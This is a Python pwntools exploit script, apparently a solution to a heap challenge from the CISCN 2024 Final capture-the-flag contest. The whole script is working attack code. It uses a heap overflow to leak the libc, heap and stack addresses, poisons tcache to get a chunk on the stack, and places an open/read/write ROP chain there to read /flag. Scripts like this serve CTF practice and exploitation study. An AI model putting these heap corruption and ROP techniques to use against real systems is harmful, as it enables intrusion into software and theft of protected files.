from pwn import *
#context(log_level = 'debug')

r = process("./pwn")
libc = ELF("./libc.so.6")

lg = lambda s: log.info('\033[1;32;40m%s --> 0x%x\033[0m' % (s, eval(s)))

first_debug = 1
debugging = 1
pausing = 1
def debug(*args):
    global first_debug
    if not debugging: return
    if first_debug:
        gdb.attach(r, *args)
        first_debug = 0
    if pausing: pause()

def parse_u64(raw):
    assert len(raw) <= 8
    return u64(raw.ljust(8, b'\0'))

def parse_int(raw):
    tokens = b'box0123456789abcdef'
    ret = ''
    for i in raw:
        if i not in tokens:
            return int(ret, 0)
        else:
            ret += chr(i)
    return int(ret, 0)

def add(size, content):
    r.sendlineafter(b'choice >> ', b'1')
    r.sendlineafter(b'size:', str(size).encode())
    r.sendafter(b'content:', content)

def delete(idx):
    r.sendlineafter(b'choice >> ', b'2')
    r.sendlineafter(b'idx:\n', str(idx).encode())

def edit(idx, content):
    r.sendlineafter(b'choice >> ', b'3')
    r.sendlineafter(b'idx:', str(idx).encode())
    r.sendafter(b'content:', content)

def show(idx, delimiter1 = b'', delimiter2 = b'Welcome to CISCN 2024 Final!', drop = 1):
    r.sendlineafter(b'choice >> ', b'4')
    r.sendlineafter(b'idx:', str(idx).encode())
    r.recvuntil(b'content:')
    if delimiter1: r.recvuntil(delimiter1)
    return r.recvuntil(delimiter2, drop = drop)[:-1]

def convert(idx):
    r.sendlineafter(b'choice >> ', b'5')
    r.sendlineafter(b'idx:\n', str(idx).encode())

def bye(idx):
    r.sendlineafter(b'choice >> ', b'6')

def show2(idx, *args, **kwargs):
    a = show(idx, *args, **kwargs)
    success('Content:')
    print()
    print(a)
    print()
    print(hexdump(a))
    print()
    print()
    return a

add(0x208, '啊'.encode() + b'a'*0x200 + b'\x41\x04')
add(0x208, b'haha')
add(0x208, b'haha')
add(0x208, p64(0)*3 + p64(0x201-0x10))
add(0x208, b'haha')
add(0x208, p64(0)*3 + p64(0x201-0x10))
convert(0)
delete(1)
add(0x438, b'a'*0x418 + p64(0x441))
delete(3)
edit(1, b'a'*0x420)
libc.address = parse_u64(show2(1)[-6:]) - 0x203b20

lg('libc.address')

edit(1, b'a'*0x208 + p64(0x211))
delete(2)
edit(1, b'a'*0x20f + b'!')
heap = parse_u64(show2(1, b'!')[:5]) << 12
lg('heap')

add(0x208, b'haha')
delete(0)
edit(1, b'a'*0x208 + p64(0x211))
delete(2)
edit(1, b'a'*0x208 + p64(0x211) + p64((heap >> 12) ^ libc.sym['environ'] - 0x208))
add(0x208, b'haha')
add(0x208, b'a'*0x208)
stack = parse_u64(show2(2)[-6:]) - 0x198
lg('stack')

delete(4)
delete(0)
edit(1, b'a'*0x208 + p64(0x211) + p64((heap >> 12) ^ stack))
add(0x208, b'a'*0x208)

pop_rdi = 0x000000000010f75b + libc.address
pop_rsi = 0x0000000000110a4d + libc.address
pop_rdx = 0x0000000000066b9a + libc.address

flag1 = stack + 0x200
flag2 = stack + 0x200
length = 0x40

payload = p64(0) + p64(pop_rdi) + p64(flag1) + p64(pop_rsi) + p64(0) + p64(libc.sym['open'])
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag2) + p64(pop_rdx) + p64(length) + p64(libc.sym['read'])
payload += b'a'*0x19 + p64(pop_rdi) + p64(1) + p64(libc.sym['write'])
#debug('b *$rebase(0x1c7d)')
add(0x208, payload.ljust(0x200, b"\x00") + b"/flag")

r.interactive()
r.close()